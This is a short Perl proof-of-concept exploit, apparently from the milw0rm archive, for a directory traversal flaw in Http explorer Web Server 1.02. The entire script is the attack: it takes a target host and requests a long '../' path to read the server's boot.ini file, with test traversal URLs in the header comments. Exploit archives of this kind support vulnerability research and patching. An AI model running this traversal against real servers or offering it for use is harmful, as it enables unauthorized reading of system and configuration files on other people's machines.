# Http explorer Web Server 1.02 Directory Transversal Vulnerability
# http://sourceforge.net/projects/http-explorer/
# Test:  http://[site]/../../../../ || http://[site]/../
# /str0ke

use LWP::Simple;
use strict;

sub usage
{
    print "Http explorer Web Server 1.02 Directory Transversal Vulnerability\n";
    print "str0ke (milw0rm.com)\n";
    print "Usage: $0 www.example.com\n";
    exit ();
}

my $host= shift || &usage;

getprint "http://" . $host . "/../../../../../../../../boot.ini";

# milw0rm.com [2006-12-21]
